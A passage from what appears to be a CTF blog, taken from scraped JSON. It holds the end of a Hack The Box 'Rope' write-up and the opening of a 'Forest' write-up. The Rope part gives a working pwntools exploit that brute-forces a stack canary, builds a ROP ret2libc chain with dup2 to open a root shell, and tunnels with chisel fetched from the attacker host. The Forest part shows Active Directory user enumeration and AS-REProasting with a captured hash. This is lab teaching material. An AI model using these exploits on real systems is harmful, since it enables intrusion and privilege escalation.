/snap/core/6964/var/log/fsck/checkroot /snap/core/6964/var/spool/rsyslog  Yes, it is /opt/support/contact, which is another binary file:\nr4j@rope:/tmp$ ls -l /opt/support/contact -rwxr-x--- 1 root adm 14632 Jun 19 2019 /opt/support/contact r4j@rope:/tmp$ file /opt/support/contact /opt/support/contact: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=cc3b330cabc203d0d813e3114f1515b044a1fd4f, stripped  Binary analysis: contact If we try to run it, we get an error:\nr4j@rope:/tmp$ /opt/support/contact ERROR: Address already in use  So, we might think that the binary is already running. In fact, if we enumerate local ports open, we see that there\u0026rsquo;s a process listening on port 1337:\nr4j@rope:/tmp$ netstat -nat Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 0.0.0.0:9999 0.0.0.0:* LISTEN tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:1337 0.0.0.0:* LISTEN tcp 0 138 10.10.10.148:43178 10.10.17.44:4444 ESTABLISHED tcp6 0 0 :::22 :::* LISTEN  Then, we can list processes and check that /opt/support/contactis running as root:\nr4j@rope:/tmp$ ps -faux | tail r4j 1973 0.0 0.2 19680 4536 pts/0 S Jul19 0:00 | \\_ bash r4j 2319 0.0 0.1 36856 3324 pts/0 R+ 00:09 0:00 | \\_ ps -faux r4j 2320 0.0 0.0 4568 848 pts/0 S+ 00:09 0:00 | \\_ tail root 1126 0.0 0.1 57500 3148 ? S Jul19 0:00 \\_ /usr/sbin/CRON -f root 1194 0.0 0.0 4628 804 ? Ss Jul19 0:00 \\_ /bin/sh -c /opt/support/contact root 1196 0.0 0.0 4516 704 ? S Jul19 0:00 \\_ /opt/support/contact syslog 1102 0.0 0.2 267272 5112 ? Ssl Jul19 0:00 /usr/sbin/rsyslogd -n root 1116 0.0 0.3 288876 6444 ? Ssl Jul19 0:00 /usr/lib/policykit-1/polkitd --no-debug root 1148 0.0 0.0 14888 1924 tty1 Ss+ Jul19 0:00 /sbin/agetty -o -p -- \\u --noclear tty1 linux root 1167 0.0 0.2 72296 5588 ? Ss Jul19 0:00 /usr/sbin/sshd -D  Let\u0026rsquo;s download the binary to our attacker machine in order to analyze it with Ghidra:\nr4j@rope:/tmp$ which python3 /usr/bin/python3 r4j@rope:/tmp$ cd /opt/support/ r4j@rope:/opt/support$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.17.44 - - [] \"GET /contact HTTP/1.1\" 200 -  $ wget 10.10.10.148:8000/contact  First of all, the binary is almost completely protected:\n$ checksec contact [*] './contact' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled  In Ghidra, we can see this main function:\nvoidmain() { longin_FS_OFFSET; socklen_tlocal_40; uintport; uintlocal_38; uintlocal_34; intlocal_30; intlocal_2c; sockaddr local_28; undefined8 canary; canary =*(undefined8 *) (in_FS_OFFSET +0x28); port =1337; local_40 =0x10; local_38 =FUN_00101267(1337); local_34 =local_38; if(0\u0026lt;(int) local_38) { printf(\"listen on port %d, fd is %d\\n\", (ulong) port, (ulong) local_38); signal(0xd, (__sighandler_t) 0x1); signal(0x11, (__sighandler_t) 0x1); while(true) { do{ local_30 =accept(local_38, \u0026amp;local_28, \u0026amp;local_40); } while(local_30 \u0026lt;0); local_2c =process(); if(local_2c ==1) break; close(local_30); } /* WARNING: Subroutine does not return */ exit(0); } perror(\"ERROR\"); /* WARNING: Subroutine does not return */ exit(local_38); }  Again, it is a socket server that listens on port 1337. Once a new connection is received, it is passed to function process (renamed from FUN_001014ee):\n__pid_tprocess(uintparam_1) { longcanary; __pid_t_Var2; __uid_t_Var3; size_t__n; longin_FS_OFFSET; canary =*(long*) (in_FS_OFFSET +0x28); _Var2 =fork(); if(_Var2 ==0) { _Var3 =getuid(); printf(\"[+] Request accepted fd %d, pid %d\\n\", (ulong) param_1, (ulong)_Var3); __n =strlen(s_Please_enter_the_message_you_wan_001040e0); write(param_1, s_Please_enter_the_message_you_wan_001040e0, __n); vuln(); send(param_1, \"Done.\\n\", 6, 0); _Var2 =0; } if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return_Var2; }  Basically, it prints some messages to stdout and then goes to vuln (renamed from FUN_0010159a):\nvoidvuln(intparam_1) { longin_FS_OFFSET; undefined local_48[56]; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); recv(param_1, local_48, 0x400, 0); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; }  Obviously, if I used vuln as a name is because the function is vulnerable. Indeed, there is a Buffer Overflow vulnerability since local_48 has 56 assigned as buffer and recv reads up to 0x400 (1024) bytes and stores them in local_48. We can test it locally:\n$ ./contact listen on port 1337, fd is 3  $ nc 127.0.0.1 1337 Please enter the message you want to send to admin: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  $ ./contact listen on port 1337, fd is 3 [+] Request accepted fd 4, pid 1000 *** stack smashing detected ***: terminated  We don\u0026rsquo;t see a segmentation fault message, but we get *** stack smashing detected ***, which is caused by the canary protection.\nBuffer Overflow exploitation Let\u0026rsquo;s give a bit of background. The stack canary is a random value computed at the begining of the program and it is saved in the stack right before the saved $rbp and $rip. When a function returns, the program checks that the value of the canary at the stack is the same as the one computed by the program at startup (which is stored in a safe location). If the values are different, the program assumes that a Buffer Overflow attack (stack smashing) has occured and it stops the execution flow (__stack_chk_fail). Otherwise, the program continues.\nHence, in order to bypass this protection, we must somehow obtain the value of the canary (which is computed at runtime, so it changes every time the program is restarted). Then we must place it in our payload, so that we overwrite the canary with the same value and the program does not notice the Buffer Overflow exploitation.\nBut how can we accomplish this? Well, this is a socket server that forks when a new connection arrives, so all the memory map is copied from the parent process to the child process. This means that the process that crashes is the child process, and the parent keeps listening for more connections. Moreover, the stack canary is set by the parent process and it is copied to the children. We can potentially leak the canary byte by byte using what\u0026rsquo;s called an oracle.\nFirst of all, let\u0026rsquo;s download the Glibc library and the loader from the machine to have the same exploit locally and remotely:\nr4j@rope:/opt/support$ cd / r4j@rope:/$ ldd /opt/support/contact linux-vdso.so.1 (0x00007ffccd8fa000) libc.so.6 = /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1bc9c6b000) /lib64/ld-linux-x86-64.so.2 (0x00007f1bca05c000) r4j@rope:/$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.17.44 - - [] \"GET /lib/x86_64-linux-gnu/libc.so.6 HTTP/1.1\" 200 - 10.10.17.44 - - [] \"GET /lib64/ld-linux-x86-64.so.2 HTTP/1.1\" 200 -  $ wget -q 10.10.10.148:8000/lib/x86_64-linux-gnu/libc.so.6 $ wget -q 10.10.10.148:8000/lib64/ld-linux-x86-64.so.2  Using pwninit we are able to patch the binary so that it uses the above library and loader:\n$ pwninit --libc libc.so.6 --ld ld-linux-x86-64.so.2 --bin contact --no-template bin: contact libc: libc.so.6 ld: ld-linux-x86-64.so.2 unstripping libc https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1_amd64.deb setting ld-linux-x86-64.so.2executable copying contactto contact_patched running patchelf on contact_patched  Now we have contact_patched, which will behave exactly as the remote one.\nLet\u0026rsquo;s start by getting the number of bytes needed to trigger the Buffer Overflow vulnerability. One way of doing this is matematically (because local_48 has 56 bytes assigned, it means that the next 8 bytes are for the stack canary, then the saved $rbp and then the saved $rip or return instruction).\nLet\u0026rsquo;s test it. If we enter exactly 56 bytes, everything is OK:\n$ python3 -c 'import os; os.write(1, b\"A\" * 56)' | nc 127.0.0.1 1337 Please enter the message you want to send to admin: Done.  $ ./contact_patched listen on port 1337, fd is 3 [+] Request accepted fd 4, pid 1000  Now let\u0026rsquo;s enter one byte more:\n$ python3 -c 'import os; os.write(1, b\"A\" * 57)' | nc 127.0.0.1 1337 Please enter the message you want to send to admin:  $ ./contact_patched listen on port 1337, fd is 3 [+] Request accepted fd 4, pid 1000 *** stack smashing detected ***: \u0026lt;unknown\u0026gt; terminated  Alright, so we know where the canary starts. Do you notice any other difference in the responses? Yes, we have an oracle! If the canary is not modified, then the server answers Done., otherwise, it does not. So we have a way to make brute force byte by byte until we get a Done. message, meaning that the tested byte is correct and we can pass to the next byte of the canary, until we get the full value.\nGetting memory leaks We can start writing an exploit script using Python and pwntools:\n#!/usr/bin/env python3 frompwnimport* context.binary=elf=ELF('contact') glibc=ELF('libc.so.6', checksec=False) defget_process(): iflen(sys.argv) !=2: log.error(f'Usage: python3 {sys.argv[0]}\u0026lt;ip:port\u0026gt;') host, port=sys.argv[1].split(':') returnremote(host, int(port)) defmain(): offset=56 junk=b'A'*offset canary=b'' canary_prog=log.progress('Canary') whilelen(canary) \u0026lt;8: forbinrange(256): withcontext.local(log_level='CRITICAL'): p=get_process() test_canary=canary+p8(b) canary_prog.status(test_canary.hex()) p.sendafter(b'admin:\\n', junk+test_canary) try: ifb'Done.'inp.recv(): canary=test_canary break exceptEOFError: pass finally: withcontext.local(log_level='CRITICAL'): p.close() canary_prog.success(canary.hex()) if__name__=='__main__': main()  After a few minutes, we will get the canary:\n$ python3 root_exploit.py 127.0.0.1:1337 [*] './contact' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Canary: 00a473852a55d816  Now that we have leaked the canary, we are able to exploit the Buffer Overflow vulnerability. We know it is indeed the canary because it has a null byte at the start, which prevents it from being leaked as a string (because strings in C are terminated by a null byte). Furthermore, as long as we don\u0026rsquo;t stop the server, the value of the canary can be hard-coded in the exploit to save time, since it won\u0026rsquo;t change.\nThe next protection we need to bypass is PIE, which means that ASLR affects the addresses of the binary. Hence, we must leak an address from the binary at runtime to compute the base address.\nFor the moment, the only thing we can do to leak this address is to continue with the brute force attack and leak the saved $rbp and $rip. We know that vuln will return back to process, so the saved return address is inside process (hence, within the binary).\nWe can still use the same oracle because $rbp and $rip are used by the program to control the stack and the execution flow, respectively. If we modify a single byte of them, it\u0026rsquo;s really likely that the program will crash, thus having the same oracle as before.\nAt this point, we can extract the code to do the brute force inside of a function and use it three times:\ndefbrute_force_value(payload: bytes, name: str, start: bytes=b'') -\u0026gt; bytes: value = start value_prog=log.progress(name) whilelen(value) \u0026lt;8: forbinrange(256): withcontext.local(log_level='CRITICAL'): p=get_process() test_value=value+p8(b) value_prog.status(test_value.hex()) p.sendafter(b'admin:\\n', payload+test_value) try: ifb'Done.'inp.recv(timeout=1): value=test_value break exceptEOFError: pass finally: withcontext.local(log_level='CRITICAL'): p.close() value_prog.success(value.hex()) return value defmain(): offset=56 junk=b'A'*offset canary=brute_force_value(junk, 'Canary ', start=b'\\0') saved_rbp=brute_force_value(junk+canary, 'Saved $rbp') saved_rip=brute_force_value(junk+canary+saved_rbp, 'Saved $rip', start=b'\\x62')  $ python3 root_exploit.py 127.0.0.1:1337 [*] './contact' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Canary : 00a473852a55d816 [+] Saved $rbp: 00d42e79ff7f0000 [+] Saved $rip: 6265406add550000  And we got the leaks (notice they are reversed). I used a start parameter to give the brute force process a fix byte where to start, because I know beforehand it will always be the same. In order to save time, we can hard-code them in the script, so we don\u0026rsquo;t have to use brute force again.\nNow we can compute the base address of the binary, because we know that vuln returns at 0x1562 (from Ghidra). We can also see it with objdump (send is called right after vuln, but the binary does not show function names because it is stripped):\n$ objdump -M intel -d contact | grep -B 6 send 0000000000001090 \u0026lt;htons@plt\u0026gt;: 1090: ff 25 b2 2f 00 00 jmp QWORD PTR [rip+0x2fb2] # 4048 \u0026lt;__cxa_finalize@plt+0x2ed8\u0026gt; 1096: 68 06 00 00 00 push 0x6 109b: e9 80 ff ff ff jmp 1020 \u0026lt;recv@plt-0x10\u0026gt; 00000000000010a0 \u0026lt;send@plt\u0026gt;: -- 155d: e8 38 00 00 00 call 159a \u0026lt;__cxa_finalize@plt+0x42a\u0026gt; 1562: 8b 45 ec mov eax,DWORD PTR [rbp-0x14] 1565: b9 00 00 00 00 mov ecx,0x0 156a: ba 06 00 00 00 mov edx,0x6 156f: 48 8d 35 26 0b 00 00 lea rsi,[rip+0xb26] # 209c \u0026lt;__cxa_finalize@plt+0xf2c\u0026gt; 1576: 89 c7 mov edi,eax 1578: e8 23 fb ff ff call 10a0 \u0026lt;send@plt\u0026gt;  This is the base address of the binary:\nelf.address=u64(saved_rip) -0x1562 log.success(f'ELF base address: {hex(elf.address)}')  $ python3 root_exploit.py 127.0.0.1:1337 [*] './contact' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Canary : 00a473852a55d816 [+] Saved $rbp: 00d42e79ff7f0000 [+] Saved $rip: 6265406add550000 [+] ELF base address: 0x55dd6a405000  As a sanity check, if the base address of the binary ends in 000, then it is probably correct. If not, there must be an error somewhere.\nRet2Libc attack Now that we have the base address of the binary, we can compute any address within the binary using the corresponding offsets. Since NX is enabled, we will need to use Return Oriented Programming (ROP) in order to execute arbitrary code. This technique makes use of gadgets, which are addresses to instructions that end in ret, so when they are placed in the stack overwriting the return address, they execute one after each other (that\u0026rsquo;s why the payload is often called ROP chain). With ROP, the program will be jumping to executable addresses within the binary, so that we bypass NX.\nThe aim of the exploit is to perform a Ret2Libc attack, that is to execute functions from Glibc. For this, we will need yet another leak, in order to bypass ASLR. The leak must be done by calling puts using as first argument an address of the GOT. As stated before, the GOT will contain the addresses of external functions at runtime. Since strings in C are pointers, if we pass an address of GOT to puts, this function will print out the value stored at that address, leading to a Glibc function leak.\nIn order to call a function like puts (which is external), we can use the Procedure Linkage Table (PLT), which is a table inside the binary that performs a jump to the address of the corresponding function.\nThen, we need to indicate the parameter to puts. Since this is a 64-bit binary, the calling conventions say that parameters to functions are passed by registers (in order: $rdi, $rsi, $rdx, $rcx\u0026hellip;). There is an useful gadget pop rdi; ret that we can use to add a given value to $rdi taken from the stack.\nThe above is a common procedure to leak function addresses for a Ret2Libc attack. This time, there is something different. We are not running the binary, but connecting to a socket, so we can\u0026rsquo;t read from stdout. Hence, instead of puts, we must call write and pass the socket file descriptor (usually, 4) as first argument, the string to print as second argument, and the length of the string as third argument.\nThese are all the values we need:\n Gadgets pop rdi; ret (offset 0x164b), pop rsi; pop r15; ret (offset 0x1649), pop rdx; ret (offset 0x1265). Notice that to set $rsi we will also need to set a dummy value to $r15:  $ ROPgadget --binary contact | grep 'pop r[ds][ix]' 0x000000000000164b : pop rdi ; ret 0x0000000000001265 : pop rdx ; ret 0x0000000000001649 : pop rsi ; pop r15 ; ret   A function to leak, for example send at the GOT (offset 0x4050):  $ readelf -r contact | grep send 000000004050 000900000007 R_X86_64_JUMP_SLO 0000000000000000 send@GLIBC_2.2.5 + 0 $ objdump -M intel -R contact | grep send 0000000000004050 R_X86_64_JUMP_SLOT send@GLIBC_2.2.5   write at the PLT (offset 0x1050):  $ objdump -M intel -d contact | grep '\u0026lt;write@plt\u0026gt;' 0000000000001050 \u0026lt;write@plt\u0026gt;: 154e: e8 fd fa ff ff call 1050 \u0026lt;write@plt\u0026gt;  All the above values can be used to craft the exploit more manually. Instead, I\u0026rsquo;ll be using pwntools functions, because we already know what we are doing:\nrop=ROP(elf) socket_fd=4 payload=junk payload+=canary payload+=saved_rbp payload+=p64(rop.find_gadget(['pop rdi', 'ret'])[0]) payload+=p64(socket_fd) payload+=p64(rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]) payload+=p64(elf.got.send) payload+=p64(0) payload+=p64(rop.find_gadget(['pop rdx', 'ret'])[0]) payload+=p64(8) payload+=p64(elf.plt.write) withcontext.local(log_level='CRITICAL'): p=get_process() p.sendlineafter(b'admin:\\n', payload) send_addr=u64(p.recv().ljust(8, b'\\0')) glibc.address=send_addr-glibc.symbols.send p.close() log.success(f'Leaked send() address: {hex(send_addr)}') log.success(f'Glibc base address : {hex(glibc.address)}')  And so, we get the leak and we can compute the base address of Glibc (substracting the offset for send):\n$ python3 root_exploit.py 127.0.0.1:1337 [*] './contact' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Canary : 00a473852a55d816 [+] Saved $rbp: 00d42e79ff7f0000 [+] Saved $rip: 6265406add550000 [+] ELF base address: 0x55dd6a405000 [*] Loaded 15 cached gadgets for 'contact' [+] Leaked send() address: 0x7f86cf406c30 [+] Glibc base address : 0x7f86cf2e4000  Again, as a sanity check, we need to verify that the base address of Glibc ends in 000 in hexadecimal.\nThe offset of send inside Glibc can be obtained manually like follows (offset 0x122c30):\n$ readelf -s libc.so.6 | grep send$ 4239: 0000000000122c30 185 FUNC LOCAL DEFAULT 13 __libc_send 5010: 0000000000122c30 185 FUNC LOCAL DEFAULT 13 __GI___send 6755: 0000000000122c30 185 FUNC WEAK DEFAULT 13 send 7504: 0000000000122c30 185 FUNC GLOBAL DEFAULT 13 __send  At this point, we only need to perform the Ret2Libc attack, which is basically calling system(\u0026quot;/bin/sh\u0026quot;) to spawn a shell. Since we have the base address of Glibc, we are able to compute the addresses of system and \u0026quot;/bin/sh\u0026quot; at runtime by using the corresponding offsets (0x4f440 and 0x1b3e9a, respectively):\n$ readelf -s libc.so.6 | grep system$ 504: 000000000004eeb0 1200 FUNC LOCAL DEFAULT 13 do_system 6032: 000000000004f440 45 FUNC WEAK DEFAULT 13 system 6696: 000000000004f440 45 FUNC GLOBAL DEFAULT 13 __libc_system $ strings -atx libc.so.6 | grep /bin/sh 1b3e9a /bin/sh  Nevertheless, this precise technique would work in a conventional Ret2Libc challenge. This time, if we use this procedure, the shell will be opened in server side. In order to get an interactive shell, we must duplicate file descriptors, so that stdin (file descriptor 0), stdout (file descriptor 1) and stderr (file descriptor 2) are copied to the socket file descriptor (which is 4). This operation can be done with dup2 from Glibc, which receives as first argument the old file descriptor and as second argument the new file descriptor. The idea is to map 4 -\u0026gt; 0, 4 -\u0026gt; 1 and 4 -\u0026gt; 2. Therefore, the ROP chain becomes a bit bigger.\nThis is the offset for dup2 inside Glibc (0x1109a0):\n$ readelf -s libc.so.6 | grep dup2$ 3623: 00000000001109a0 33 FUNC LOCAL DEFAULT 13 __GI___dup2 3726: 00000000001109a0 33 FUNC LOCAL DEFAULT 13 __GI_dup2 5583: 00000000001109a0 33 FUNC WEAK DEFAULT 13 dup2 5595: 00000000001109a0 33 FUNC GLOBAL DEFAULT 13 __dup2  So this is the full ROP chain to get a shell (I used Glibc to get ROP gadgets as well):\nrop=ROP([elf, glibc]) payload=junk payload+=canary payload+=saved_rbp forfdin[0, 1, 2]: payload+=p64(rop.find_gadget(['pop rdi', 'ret'])[0]) payload+=p64(socket_fd) payload+=p64(rop.find_gadget(['pop rsi', 'ret'])[0]) payload+=p64(fd) payload+=p64(glibc.symbols.dup2) payload+=p64(rop.find_gadget(['pop rdi', 'ret'])[0]) payload+=p64(next(glibc.search(b'/bin/sh'))) payload+=p64(glibc.symbols.system) withcontext.local(log_level='CRITICAL'): p=get_process() p.sendlineafter(b'admin:\\n', payload) print() p.interactive()  And we obtain an interactive shell in our local environment:\n$ python3 root_exploit.py 127.0.0.1:1337 [*] './contact' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Canary : 00a473852a55d816 [+] Saved $rbp: 00d42e79ff7f0000 [+] Saved $rip: 6265406add550000 [+] ELF base address: 0x55dd6a405000 [*] Loaded 15 cached gadgets for 'contact' [+] Leaked send() address: 0x7f86cf406c30 [+] Glibc base address : 0x7f86cf2e4000 [*] Loaded 198 cached gadgets for 'libc.so.6' [*] Switching to interactive mode $ whoami rocky $ ls contact contact_patched fmtstr_exploit.py httpserver ld-linux-x86-64.so.2 libc-2.27.so libc.so.6 root_exploit.py  Now it\u0026rsquo;s time to run the exploit remotely.\nPort forwarding Since the binary is running locally in 127.0.0.1:1337, we will need to use port forwarding. This can be done using chisel:\nr4j@rope:/tmp$ wget -q 10.10.17.44/chisel r4j@rope:/tmp$ chmod +x chisel r4j@rope:/tmp$ ./chisel client 10.10.17.44:1234 R:31337:127.0.0.1:1337 client: Connecting to ws://10.10.17.44:1234 client: Connected (Latency 32.402246ms)  $ ./chisel server -p 1234 --reverse server: Reverse tunnelling enabled server: Fingerprint FLlc9PM/TqWSYH1qDJuLl55hSejclXF+Nik/RhshHrc= server: Listening on http://0.0.0.0:1234 server: session#1: tun: proxy#R:31337=\u0026gt;1337: Listening  After some minutes of brute force, we will finally get a shell as root:\n$ python3 root_exploit.py 127.0.0.1:31337 [*] './contact' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Canary : 00fbee3a3e3cc553 [+] Saved $rbp: 503afae5fc7f0000 [+] Saved $rip: 62750eaf8e550000 [+] ELF base address: 0x558eaf0e6000 [*] Loaded 15 cached gadgets for 'contact' [+] Leaked send() address: 0x7f0645e13c30 [+] Glibc base address : 0x7f0645cf1000 [*] Loaded 198 cached gadgets for 'libc.so.6' [*] Switching to interactive mode $ whoami root $ cat /root/root.txt 9d184e53053f4678beb271e733de867e  The full exploit script can be found in here: root_exploit.py.\n","image":"/images/HTB/Rope/Rope.png","permalink":"https://7rocky.github.io/en/htb/rope/","section":"htb","summary":"Hack The Box. Linux. Insane machine. This machine exposes a custom web server that is vulnerable to Directory Path Traversal so we can read files and discover that it is a binary file. After ananlyzing the binary, we discover that it has a Format String vulnerability that can be exploited to get RCE as john. This user is able to run another binary as user r4j. This binary uses an external library that we can modify because of its permissions and gain access as r4j. Finally, there\u0026rsquo;s another binary that runs a local socket server, we can access the binary and analyze it to find out a Buffer Overflow vulnerability. The binary has all protections set, but it is still exploitable to get RCE as root","time":39,"title":"Rope"},{"contents":"  OS: Windows   Difficulty: Easy   IP Address: 10.10.10.161   Release: 12 / 10 / 2019   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.10.161 -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49703,49940 Nmap scan report for htb.local (10.10.10.161) Host is up (0.10s latency).  PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: ) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49677/tcp open msrpc Microsoft Windows RPC 49684/tcp open msrpc Microsoft Windows RPC 49703/tcp open msrpc Microsoft Windows RPC 49940/tcp open msrpc Microsoft Windows RPC Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows  Host script results: |_clock-skew: mean: 2h39m47s, deviation: 4h02m30s, median: 19m47s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: |_ start_date:  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 70.52 seconds This machine has ports 53 (DNS), 88 (Kerberos), 135 (MS-RPC), 389 (LDAP) and 445 (SMB) open, within others.\n$ crackmapexec smb 10.10.10.161 SMB 10.10.10.161 445 FOREST [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) Moreover, we see that the machine is a domain controler (DC) from an Active Directory (AD) environment. We can start adding htb.local into /etc/hosts.\nMS RPC enumeration With rpcclient we can enumerate domain users, using a null session:\n$ rpcclient -U \u0026#39;\u0026#39; 10.10.10.161 -N -c enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] user:[$331000-VK4ADACQNUCA] rid:[0x463] user:[SM_2c8eef0a09b545acb] rid:[0x464] user:[SM_ca8c2ed5bdab4db9a] rid:[0x465] user:[SM_75a538d3025e4db9a] rid:[0x466] user:[SM_681f53d4942840e18] rid:[0x467] user:[SM_1b41c9286325457bb] rid:[0x468] user:[SM_9b69f1b9d2cc45549] rid:[0x469] user:[SM_7c96b981967141ebb] rid:[0x46a] user:[SM_c75ee099d0a64c91b] rid:[0x46b] user:[SM_1ffab36a2f5f479cb] rid:[0x46c] user:[HealthMailboxc3d7722] rid:[0x46e] user:[HealthMailboxfc9daad] rid:[0x46f] user:[HealthMailboxc0a90c9] rid:[0x470] user:[HealthMailbox670628e] rid:[0x471] user:[HealthMailbox968e74d] rid:[0x472] user:[HealthMailbox83d6781] rid:[0x473] user:[HealthMailboxfd87238] rid:[0x474] user:[HealthMailboxb01ac64] rid:[0x475] user:[HealthMailbox7108a4e] rid:[0x477] user:[HealthMailbox0659cc1] rid:[0x478] user:[sebastien] rid:[0x479] user:[lucinda] rid:[0x47a] user:[svc-alfresco] rid:[0x47b] user:[andy] rid:[0x47e] user:[mark] rid:[0x47f] user:[santi] rid:[0x480] Using some shell scripting and regular expressions we are able to extract the usernames and save them to a file called user.txt:\n$ rpcclient -U \u0026#39;\u0026#39; 10.10.10.161 -N -c enumdomusers | grep -oP \u0026#39;\\[\\D*?\\]\u0026#39; | tr -d \u0026#39;[]\u0026#39; | tee users.txt Administrator Guest krbtgt DefaultAccount sebastien lucinda svc-alfresco andy mark santi Another way of finding valid users is with the krb5-enum-users.nse script of nmap and a given list of usernames (for example, one from SecLists):\n$ nmap --script krb5-enum-users --script-args krb5-enum-users.realm=\u0026#39;htb.local\u0026#39;,userdb=$WORDLISTS/SecLists/Usernames/Names/names.txt 10.10.10.161 -p 88 Starting Nmap 7.91 ( https://nmap.org ) Stats: 0:01:39 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 64.53% done; ETC: 07:53 (0:00:54 remaining) Nmap scan report for htb.local (10.10.10.161) Host is up (0.041s latency). PORT STATE SERVICE 88/tcp open kerberos-sec | krb5-enum-users: | Discovered Kerberos principals | lucinda@htb.local | sebastien@htb.local | mark@htb.local | andy@htb.local |_ forest@htb.local Nmap done: 1 IP address (1 host up) scanned in 143.69 seconds AS-REProasting attack Now we can perform an AS-REProasting attack because we have potentially valid usernames. We find that svc-alfresco is \u0026ldquo;AS-REProastable\u0026rdquo;:\n$ GetNPUsers.py htb.local/ -no-pass -usersfile users.txt Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation [-] User Administrator doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] User sebastien doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User lucinda doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set $krb5asrep$23$svc-alfresco@HTB.LOCAL:d90ded029bb968322842c61524dba44c$b826f6094adadef8674b55fc44f5fce9b0297439b3d501fb1906ae4efe90943d7e63418c54c6d449deabe7990ff404f33449593977a0ed21f81b44ebd5893f58fa42073485e464d123928e62f1f46c7b314a54780b2040bbea1ad53bccb99d59d730f2eb95102e3b62d1b95cec5249f62ae8c14e04130e9551cff3a94e5fb54caf758746c76be39453504f86ef2f468ed77fa6090d958cf81c88efb7c5bd8f00f1ba978537f8177e385167c35751ad38fa7d1717674446b8d0142c2e1aa275542a31b93a6eb5660aeffb5b26ea75685fcfee74053bdf346d55101c2d6c3e58fe50b375f73e35 [-] User andy doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User mark doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User santi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set The resulting hash is the Ticket Granting Ticket (TGT) for user svc-alfresco and can be cracked easily with john and rockyou.txt:\n$ echo 